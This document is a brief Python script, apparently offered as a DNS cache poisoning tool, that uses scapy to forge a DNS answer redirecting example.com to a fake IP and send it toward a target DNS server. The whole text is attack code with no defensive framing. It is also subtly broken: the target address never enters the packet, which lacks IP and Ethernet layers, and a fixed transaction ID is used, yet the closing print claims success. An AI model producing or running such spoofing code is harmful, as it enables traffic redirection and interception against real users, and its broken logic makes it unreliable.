import scapy.all as scapy

# Set the target DNS server IP and the domain to poison
dns_server_ip = "192.168.1.1"
domain_to_poison = "example.com"
fake_ip = "10.0.0.1"

# Create a DNS query packet with a fake response
dns_query = scapy.DNSQR(qname=domain_to_poison, qtype="A")
dns_response = scapy.DNSRR(rrname=domain_to_poison, type="A", rdata=fake_ip, ttl=3600)
dns_packet = scapy.UDP(dport=53) / scapy.DNS(id=0x1234, qr=1, aa=1, rd=1, ra=1, z=0, ad=0, cd=0, rcode=0, qdcount=1, ancount=1, nscount=0, arcount=0, qd=dns_query, an=dns_response)

# Send the spoofed DNS response to the target DNS server
scapy.sendp(dns_packet, iface="eth0", verbose=0)

print(f"Sent spoofed DNS response to {dns_server_ip} for {domain_to_poison} -> {fake_ip}")